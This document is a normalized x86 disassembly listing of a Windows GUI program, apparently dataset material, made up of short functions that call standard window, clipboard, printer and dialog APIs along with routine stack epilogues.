jmp sub_403960
j_sub_4238ca
jmp sub_4238ca
sub_4238da
pop ebx
pop ecx
pop ebp
retn
sub_423975
jmp sub_403960
sub_42397c
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_423988
mov eax [ eax + 0x20 ]
retn
sub_423ab7
jmp sub_403960
sub_423abe
pop ebp
retn
sub_423ac0
sub [ rw-data ] 0x1
retn
ClosePrinter
jmp [ __import_lookup_table_13(winspool:ClosePrinter) ]
OpenPrinterA
jmp [ OpenPrinterA@IAT ]
sub_423b0d
jmp sub_403960
sub_423b14
pop ebp
retn
sub_423b18
sub [ rw-data ] 0x1
retn
sub_423d7f
jmp sub_403960
sub_423d86
mov eax ebx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_423f66
jmp sub_403960
sub_423f6d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_423fd9
jmp sub_403960
sub_423fe0
pop ecx
pop ecx
pop ebp
retn
sub_4242f7
jmp sub_403960
sub_4242fe
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42435f
jmp sub_403960
sub_424366
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_4243d6
jmp sub_403960
sub_4243dd
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4243e4
push ebx
mov ebx eax
cmp [ ebx + 0x14 ] 0xffffffff
jne r-xdata
mov eax [ ebx + 0x14 ]
pop ebx
retn
mov eax ebx
call sub_42463c
sub_4245d7
jmp sub_403960
sub_4245e8
jmp sub_4036ac
sub_42462b
jmp sub_403960
sub_424632
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4247d9
jmp sub_403960
sub_424819
jmp sub_403960
sub_424820
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424878
add eax 0x8
call sub_40ccd0
retn
sub_424884
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_423d90
mov [ rw-data ] eax
sub_4248d5
jmp sub_403960
sub_4248dc
pop ebp
retn
sub_4248e0
sub [ rw-data ] 0x1
retn
sub_424bed
jmp sub_403960
sub_424bf4
pop ebp
retn
sub_424bf8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_424944
sub_424cd8
retn
sub_424d4c
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_424d58
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_424d64
mov edx [ eax ]
call [ edx ]
retn
sub_424d6c
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_424d99
jmp sub_403960
sub_424da0
pop ebp
retn
sub_424da4
sub [ rw-data ] 0x1
retn
sub_424f63
jmp sub_403960
sub_424f6a
pop ebp
retn
sub_42531f
jmp sub_403960
sub_425326
mov al [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_425740
jmp sub_403960
sub_425747
pop ebp
retn
sub_42574c
sub [ rw-data ] 0x1
jae r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_424cdc
mov [ rw-data ] eax
sub_42578d
jmp sub_403960
sub_425794
pop ebp
retn
sub_425798
sub [ rw-data ] 0x1
retn
sub_4257c5
jmp sub_403960
sub_4257cc
pop ebp
retn
sub_4257d0
sub [ rw-data ] 0x1
retn
sub_4257fd
jmp sub_403960
sub_425804
pop ebp
retn
sub_425808
sub [ rw-data ] 0x1
retn
sub_425835
jmp sub_403960
sub_42583c
pop ebp
retn
sub_425840
sub [ rw-data ] 0x1
retn
sub_42586d
jmp sub_403960
sub_425874
pop ebp
retn
sub_425878
sub [ rw-data ] 0x1
retn
sub_4258a5
jmp sub_403960
sub_4258ac
pop ebp
retn
sub_4258b0
sub [ rw-data ] 0x1
retn
sub_4258dd
jmp sub_403960
sub_4258e4
pop ebp
retn
sub_4258e8
sub [ rw-data ] 0x1
retn
ChooseColorA
jmp [ ChooseColorA@IAT ]
PrintDlgA
jmp [ __import_lookup_table_14(comdlg32:PrintDlgA) ]
sub_425925
jmp sub_403960
sub_42592c
pop ebp
retn
sub_425930
sub [ rw-data ] 0x1
retn
sub_42595d
jmp sub_403960
sub_425964
pop ebp
retn
sub_425968
sub [ rw-data ] 0x1
retn
sub_4261b6
jmp sub_4036ac
sub_4261bb
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45b724
call sub_403a14
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4261d8
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_4261e0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_403420
pop esi
retn
sub_4261f8
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_403420
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_426210
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_4262b9
jmp sub_403960
sub_4262e7
jmp sub_403960
sub_4262ee
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4262f8
push ebx
cmp [ eax + 0x4a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_42630c
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_426431
jmp sub_403960
sub_426438
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4264fe
jmp sub_403960
sub_426505
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4265e0
push esi
mov esi eax
mov eax [ esi + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4266e4
jmp sub_403960
sub_426760
jmp sub_403960
sub_426767
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4267f2
jmp sub_403960
sub_426c0e
jmp sub_403960
sub_426c15
pop ebp
retn
sub_42905a
jmp sub_4036ac
sub_429113
jmp sub_403960
sub_42911a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_429120
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_429094
sub_429130
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_429094
sub_429140
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_429094
pop ebp
retn 0x8
sub_429158
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_429284
push ebx
mov ebx eax
mov eax ebx
call sub_4419a4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_429298
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4292cc
cmp [ eax + 0x21e ] 0x0
jne r-xdata
retn
mov [ edx + 0xc ] 0x1
sub_4293d0
jmp sub_403960
sub_4293d7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42957a
jmp sub_403960
sub_429581
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42958b
inc [ ecx ]
add [ eax ] al
add [ edi ] dl
add [ eax ] al
mov [ eax + 0x220 ] dl
mov edx [ eax ]
call [ edx + 0x7c ]
retn
sub_4295a0
push ebx
mov ebx eax
mov [ ebx + 0x211 ] dl
mov eax ebx
call sub_43ec8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4295bc
push ebx
mov ebx eax
mov [ ebx + 0x212 ] dl
mov eax ebx
call sub_43ec8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4295d8
push ebx
mov ebx eax
mov [ ebx + 0x214 ] edx
mov eax ebx
call sub_43ec8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4295f4
push ebx
mov ebx eax
mov [ ebx + 0x218 ] edx
mov eax ebx
call sub_43ec8c
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_429610
cmp dl [ eax + 0x21c ]
je r-xdata
retn
mov [ eax + 0x21c ] dl
call sub_43f96c
sub_429624
mov al [ eax + 0x220 ]
retn
sub_42978d
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
sub_4297a5
jmp sub_403960
sub_429ab1
jmp sub_4036ac
sub_429c24
retn
sub_429db1
jmp sub_403960
sub_429e34
push ebx
mov ebx eax
mov eax ebx
call sub_43dca0
mov eax ebx
call sub_429c28
pop ebx
retn
sub_429e48
push ebx
mov ebx eax
mov [ ebx + 0x220 ] 0x1
mov eax ebx
call sub_43e3c0
mov [ ebx + 0x220 ] 0x0
mov eax ebx
call sub_429f70
pop ebx
retn
sub_429f60
push esi
mov esi eax
mov eax [ esi + 0x214 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_42a039
jmp sub_403960
sub_42a040
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42a088
push ebx
mov ebx eax
mov eax ebx
call sub_441928
mov eax ebx
call sub_429c28
pop ebx
retn
sub_42a09c
push ebx
mov ebx eax
mov eax ebx
call sub_431350
mov eax ebx
call sub_429c28
pop ebx
retn
sub_42a0b0
mov al 0x1
retn
sub_42a0b4
push ebp
mov ebp esp
pop ebp
retn 0x8
sub_42a7e7
jmp sub_403960
sub_42a854
jmp sub_403960
sub_42a970
push ebx
lea ebx [ eax + 0x190 ]
push ebx
lea ebx [ eax + 0x1ac ]
push ebx
call sub_42a89c
pop ebx
retn
sub_42aabc
mov [ eax + 0x16d ] dl
mov edx [ eax ]
call [ edx + 0x80 ]
retn
sub_42ab3c
push ebx
mov ebx eax
mov eax ebx
call sub_4338a4
mov [ ebx + 0x29a ] 0x1
pop ebx
retn
sub_42add9
jmp sub_403960
sub_42ade0
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42ae6d
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x71b9173d ]
add [ eax ] al
cmp [ ebx + 0x299 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_42b280
sub_42b02e
jmp sub_403960
sub_42b035
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42b040
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x23c ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop esi
pop ebx
retn
sub_42b098
push ecx
mov [ esp ] cl
mov [ eax + 0x29a ] 0x0
mov cl [ esp ]
call sub_4411f8
pop edx
retn
sub_42b108
push ebx
mov ebx eax
mov eax ebx
call sub_433848
mov edx [ ebx + 0x2a4 ]
mov eax ebx
call sub_42b4b0
pop ebx
retn
sub_42b1e3
jmp sub_403960
sub_42b1ea
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42b207
lea eax [ ebp - 0xc ]
call sub_403f5c
retn
sub_42b200
jmp sub_403960
sub_42b207
mov al [ ebp - 0x1 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42b40f
jmp sub_403960
sub_42b436
jmp sub_403960
sub_42b43d
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b488
cmp edx [ eax + 0x29c ]
je r-xdata
retn
mov [ eax + 0x29c ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b49c
cmp edx [ eax + 0x2a0 ]
je r-xdata
retn
mov [ eax + 0x2a0 ] edx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_42b783
retn
sub_42b784
jmp sub_403960
j_sub_42b783
jmp sub_42b783
sub_42b78b
pop ebp
retn
sub_42b790
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax r-xdata
call sub_403ce4
mov eax [ r-xdata ]
call sub_413154
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4131a0
sub_42b7e5
jmp sub_403960
sub_42b7ec
pop ebp
retn
sub_42b7f0
sub [ rw-data ] 0x1
retn
sub_42b829
jmp sub_403960
sub_42b830
pop ebp
retn
sub_42b834
sub [ rw-data ] 0x1
jae r-xdata
retn
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
push r-xdata
call RegisterClipboardFormatA
mov [ rw-data ] ax
xor eax eax
mov [ rw-data ] eax
sub_42b8b0
retn
sub_42b8b1
jmp sub_403960
j_sub_42b8b0
jmp sub_42b8b0
sub_42b8b8
pop ebp
retn
sub_42b8bc
sub [ rw-data ] 0x1
retn
sub_42b8c4
push ebx
push esi
mov bl 0xb
mov esi rw-data
mov eax [ esi ]
call sub_403224
add esi 0x4
dec bl
jne r-xdata
pop esi
pop ebx
retn
sub_42b988
jmp sub_403960
sub_42b98f
pop ebp
retn
sub_42b994
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_42b8e0
call sub_403d30
mov eax rw-data
xor ecx ecx
mov edx 0x2c
call sub_402c40
sub_42b9e1
jmp sub_403960
sub_42b9e8
pop ebp
retn
sub_42b9ec
sub [ rw-data ] 0x1
retn
sub_42ba48
jmp sub_403960
sub_42ba4f
pop ebp
retn
sub_42ba54
sub [ rw-data ] 0x1
retn
sub_42bab0
jmp sub_403960
sub_42bab7
pop ebp
retn
sub_42babc
sub [ rw-data ] 0x1
retn
sub_42bb1d
jmp sub_403960
sub_42bb24
pop ebp
retn
sub_42bb28
sub [ rw-data ] 0x1
retn
sub_42bb74
jmp sub_403960
sub_42bb7b
pop ebp
retn
sub_42bb80
sub [ rw-data ] 0x1
retn
sub_42bbad
jmp sub_403960
sub_42bbb4
pop ebp
retn
sub_42bbb8
sub [ rw-data ] 0x1
retn
sub_42bc60
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
retn
mov eax r-xdata
call sub_40bc40
mov [ rw-data ] eax
sub_42bc95
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xc ]
pop ebx
pop ebp
retn 0x4
sub_42bcac
push ebp
mov ebp esp
push ebx
mov eax ecx
mov ecx [ ebp + 0x8 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop ebx
pop ebp
retn 0x4
sub_42bd2f
jmp sub_403960
sub_42bd36
pop ebp
retn
sub_42bd38
sub [ rw-data ] 0x1
retn
sub_42bda7
jmp [ edi ]
sub_42c048
cmp [ eax + 0x5 ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x6 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_42c060
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_42c0a4
push ebx
mov ebx eax
mov eax ebx
call sub_42c7cc
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_42c7bb
jmp sub_403960
sub_42c7cc
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_4256d0
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_42c074
sub_42c823
jmp sub_403960
sub_42c82a
pop ebp
retn
sub_42c82c
sub [ rw-data ] 0x1
retn
sub_430bf4
mov dl 0x1
test eax eax
je r-xdata
xor edx edx
cmp [ eax + 0x7c ] 0x0
jne r-xdata
mov eax edx
retn
mov eax [ eax + 0x30 ]
test eax eax
jne r-xdata
sub_430ecb
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add [ ebx - 0x75 ] dl
fimul [ ebx - 0x1c85172d ]
add [ eax ] al
and [ ebx + 0x24 ] 0xfffffffc
pop ebx
retn
sub_431286
jmp sub_403960
sub_43128d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431312
jmp sub_403960
sub_431319
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431320
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43ec8c
pop ebx
retn
sub_431334
push ebx
mov ebx eax
mov eax ebx
call sub_4419e4
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
call sub_43ec8c
pop ebx
retn
sub_431350
push ebx
mov ebx eax
mov eax ebx
call sub_4409b8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
pop ebx
retn
sub_4313fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43bbcc
pop esi
pop ebx
retn
sub_431566
jmp sub_403960
sub_43156d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_43167c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_43dca0
mov eax ebx
mov si 0xffc7
call sub_403420
pop esi
pop ebx
retn
sub_431768
push esi
mov esi eax
cmp dl [ esi + 0x16c ]
je r-xdata
pop esi
retn
mov [ esi + 0x16c ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431784
push esi
cmp dl [ eax + 0x16d ]
je r-xdata
pop esi
retn
mov [ eax + 0x16d ] dl
mov si 0xffc7
call sub_403420
sub_4317a0
test [ eax + 0x50 ] 0x40
setne al
xor al 0x1
retn
sub_4317ac
mov [ eax + 0x168 ] edx
test edx edx
je r-xdata
retn
xchg edx eax
call sub_4194c0
sub_4317c0
push esi
mov esi eax
cmp dl [ esi + 0x170 ]
je r-xdata
pop esi
retn
mov [ esi + 0x170 ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431820
push esi
mov esi eax
cmp dl [ esi + 0x16e ]
je r-xdata
pop esi
retn
mov [ esi + 0x16e ] dl
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_431894
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
mov eax ebx
mov si 0xffc7
call sub_403420
pop esi
pop ebx
retn
sub_4318b0
push esi
mov esi eax
mov eax esi
call sub_43d7ac
mov eax esi
mov si 0xffc7
call sub_403420
pop esi
retn
sub_431955
jmp sub_403960
sub_43195c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431964
push ebx
mov ebx eax
mov eax ebx
call sub_43d910
cmp [ ebx + 0x182 ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x184 ]
call [ ebx + 0x180 ]
sub_431988
push ebx
mov ebx eax
mov eax ebx
call sub_43d928
cmp [ ebx + 0x17a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x17c ]
call [ ebx + 0x178 ]
sub_431a74
cmp dl [ eax + 0x20f ]
je r-xdata
retn
mov [ eax + 0x20f ] dl
call sub_432080
sub_431a88
push ebx
mov ebx eax
cmp dl [ ebx + 0x20c ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x20c ] dl
mov eax ebx
call sub_432080
mov eax ebx
call sub_43f96c
sub_431aac
cmp dl [ eax + 0x213 ]
je r-xdata
retn
mov [ eax + 0x213 ] dl
call sub_43f96c
sub_431ac0
cmp dl [ eax + 0x211 ]
je r-xdata
retn
mov [ eax + 0x211 ] dl
call sub_43f96c
sub_431b04
cmp dl [ eax + 0x212 ]
je r-xdata
retn
mov [ eax + 0x212 ] dl
call sub_43f96c
sub_431c05
jmp sub_403960
sub_431c0c
pop ebx
pop ecx
pop ebp
retn
sub_431d24
push ebx
mov ebx eax
push r-xdata
mov eax ebx
call sub_4423cc
push eax
call SetWindowTextA
pop ebx
retn
sub_431d40
push ebx
mov ebx eax
push 0xffffffff
push 0x0
push 0xb1
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
pop ebx
retn
sub_431de6
jmp sub_403960
sub_431ded
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431e86
jmp sub_403960
sub_431fff
jmp sub_403960
sub_432064
push ebx
mov ebx eax
mov eax ebx
call sub_431b18
mov [ ebx + 0x215 ] al
mov eax ebx
call sub_43f768
pop ebx
retn
sub_432164
push ebx
mov ebx eax
mov eax ebx
call sub_43b7d8
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_43225c
push esi
cmp [ edx + 0x6 ] 0x300
jne r-xdata
pop esi
retn
cmp [ eax + 0x214 ] 0x0
jne r-xdata
mov si 0xffb3
call sub_403420
sub_43251f
jmp sub_403960
sub_432526
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4325d0
push esi
mov esi eax
mov eax [ esi + 0x10 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
pop esi
retn
sub_432630
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_43bbcc
pop esi
pop ebx
retn
sub_43270d
jmp sub_403960
sub_432714
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4329a8
mov al [ eax + 0x224 ]
retn
sub_4329b0
push ebx
mov ebx eax
mov eax ebx
call sub_43dca0
xor edx edx
mov eax ebx
call sub_431b50
pop ebx
retn
sub_4329c8
cmp dl [ eax + 0x224 ]
je r-xdata
retn
mov [ eax + 0x224 ] dl
call sub_43f96c
sub_4329dc
push esi
mov esi eax
mov eax [ esi + 0x220 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
pop esi
retn
sub_4329ec
cmp dl [ eax + 0x225 ]
je r-xdata
retn
mov [ eax + 0x225 ] dl
call sub_43f96c
sub_432a00
cmp dl [ eax + 0x226 ]
je r-xdata
retn
mov [ eax + 0x226 ] dl
call sub_43f96c
sub_432a48
call sub_441654
retn
sub_432a74
push ebx
mov ebx eax
push 0x0
push 0x0
push 0x146
mov eax [ ebx + 0x10 ]
call sub_4423cc
push eax
call SendMessageA
pop ebx
retn
sub_432af6
jmp sub_403960
sub_432afd
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432be8
jmp sub_403960
sub_432bef
pop ebx
pop ecx
pop ebp
retn
sub_432ce3
jmp sub_403960
sub_432cea
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432d67
jmp sub_403960
sub_432d6e
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_432ec4
push ebx
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_43bba8
mov eax [ ebx + 0x23c ]
mov edx [ eax ]
call [ edx + 0x44 ]
mov [ ebx + 0x260 ] 0xffffffff
pop ebx
retn
sub_432f14
push ebx
mov ebx eax
push 0xffff0000
push 0x0
push 0x142
mov eax ebx
call sub_4423cc
push eax
call SendMessageA
pop ebx
retn
sub_433008
test edx edx
jle r-xdata
retn
mov [ eax + 0x238 ] edx
call sub_43f96c
sub_43303c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_433044
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_43304c
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_433078
cmp eax [ edx + 0x8 ]
je r-xdata
retn
push 0x0
xor ecx ecx
mov edx 0x14f
call sub_43cd98
sub_4331d0
push ebx
push esi
mov esi eax
mov eax [ esi + 0x258 ]
push eax
mov ecx [ esi + 0x244 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf4 ]
pop esi
pop ebx
retn
sub_4334a7
jmp sub_4036ac
sub_4334ac
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_45b724
call sub_403a14
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_433738
jmp sub_403960
sub_43373f
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433748
push ebx
mov ebx eax
mov eax ebx
call sub_43b7d8
cmp [ ebx + 0x21a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x21c ]
call [ ebx + 0x218 ]
sub_433815
jmp sub_403960
sub_43381c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_433828
push ebx
cmp [ eax + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_4338a4
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_4339be
jmp sub_403960
sub_433a08
or edx 0xffffffff
mov ecx [ eax ]
call [ ecx + 0xd0 ]
retn
sub_433a93
jmp sub_403960
sub_433a9a
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433acc
mov edx [ eax ]
call [ edx + 0x104 ]
retn
sub_433ad8
mov [ eax + 0x210 ] edx
retn
sub_433b29
jmp sub_403960
sub_433b30
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_433c38
mov dl [ eax + 0x276 ]
add dl 0xfd
sub dl 0x2
jae sub_433c4d
mov eax [ eax + 0x238 ]
retn
sub_433c4d
push 0x0
xor ecx ecx
mov edx 0x154
call sub_43cd98
retn
sub_433f8c
jmp sub_403960
sub_433f93
pop ebx
mov esp ebp
pop ebp
retn
sub_434350
jmp sub_403960
sub_434357
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434515
jmp sub_403960
sub_43451c
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_434528
push ebx
cmp [ eax + 0x28a ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x28c ]
call [ ebx + 0x288 ]
sub_43470c
mov eax [ eax + 0x23c ]
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_434718
mov eax [ r-xdata ]
retn
sub_434949
jmp sub_403960
sub_434958
retn
sub_434a0e
jmp sub_403960
sub_434ab8
mov eax [ r-xdata ]
retn
sub_434ac0
xor eax eax
retn
sub_434ae4
retn
sub_434bfc
cmp dl [ eax + 0x209 ]
je r-xdata
retn
mov [ eax + 0x209 ] dl
call sub_43f96c
sub_434c74
push ebx
mov ebx eax
mov eax ebx
call sub_452980
test eax eax
je r-xdata
mov eax ebx
call sub_43d120
pop ebx
retn
mov edx [ ebx + 0x214 ]
mov [ eax + 0x24c ] edx
sub_434c98
xor eax eax
retn
sub_434d5f
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x59e5173d ]
add [ eax ] al
mov al [ ebx + 0x210 ]
mov [ ebx + 0x212 ] al
pop ebx
retn
sub_434d78
push esi
cmp [ edx + 0x6 ] 0x0
jne r-xdata
pop esi
retn
mov si 0xffeb
call sub_403420
sub_434e69
lea eax [ ebp - 0x4 ]
call sub_403f5c
retn
sub_434e72
jmp sub_403960
j_sub_434e69
jmp sub_434e69
sub_434e79
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434fac
mov al [ eax + 0x211 ]
retn
sub_434fe0
cmp dl [ eax + 0x210 ]
je r-xdata
retn
mov [ eax + 0x210 ] dl
call sub_43f96c
sub_4351c0
call sub_43f96c
retn
sub_43523d
jmp sub_403960
sub_435244
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435607
jmp sub_403960
sub_43560e
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_435618
mov ecx [ eax + 0x214 ]
push ecx
mov ecx [ eax + 0x210 ]
call sub_4354d0
retn
sub_435684
mov ecx [ eax + 0x214 ]
push ecx
mov ecx edx
mov edx [ eax + 0x20c ]
call sub_4354d0
retn
sub_43569c
push edx
mov ecx [ eax + 0x210 ]
mov edx [ eax + 0x20c ]
call sub_4354d0
retn
sub_4356b0
push ebx
mov ebx eax
mov eax ebx
call sub_43b7d8
cmp [ ebx + 0x22a ] 0x0
je r-xdata
pop ebx
retn
mov edx ebx
mov eax [ ebx + 0x22c ]
call [ ebx + 0x228 ]
sub_4356d4
push ebx
cmp [ eax + 0x232 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x234 ]
call [ ebx + 0x230 ]
sub_43580c
call sub_4356f4
retn
sub_435814
call sub_4356f4
retn
sub_435844
mov ecx [ eax ]
call [ ecx - 0x10 ]
retn
sub_435871
jmp sub_403960
sub_435878
pop ebp
retn
sub_43587c
sub [ rw-data ] 0x1
retn
sub_4359d9
jmp sub_403960
sub_4359e0
pop ebp
retn
sub_4359e4
sub [ rw-data ] 0x1
retn
sub_4359fd
add eax 0xffffffe0
jmp sub_435fe4
sub_435a05
add eax 0xffffffe0
jmp sub_43604c
sub_435a0d
add eax 0xffffffe0
jmp sub_436160
sub_435a15
add eax 0xffffffe0
jmp sub_4361d4
sub_435a1d
add eax 0xffffffe0
jmp sub_435c90
sub_435a25
add eax 0xffffffe0
jmp sub_435ca4
sub_435a2d
add eax 0xffffffe0
jmp sub_435d1c
sub_435a35
